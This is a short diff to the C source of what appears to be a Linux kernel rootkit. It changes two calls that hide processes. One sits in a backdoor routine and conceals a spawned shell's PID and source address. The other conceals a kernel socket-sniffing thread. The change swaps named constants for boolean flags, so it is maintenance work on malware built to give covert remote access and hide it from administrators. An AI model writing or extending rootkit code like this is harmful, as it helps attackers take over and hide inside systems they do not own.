@@ -279,7 +279,7 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select)
 	msleep(300);
 
 	if (!ret) {
-		kv_hide_task_by_pid(shellpid, saddr, WHATEVER);
+		kv_hide_task_by_pid(shellpid, saddr, false);
 	}
 
 	kv_mem_free(&rev);
@@ -652,7 +652,7 @@ struct task_struct *kv_sock_start_sniff(void)
 			kthread_stop(tsk);
 			goto leave;
 		}
-		kv_hide_task_by_pid(tsk_iph->pid, 0, CHILDREN);
+		kv_hide_task_by_pid(tsk_iph->pid, 0, true);
 
 		priv.task = tsk;
 		ops.priv = &priv;
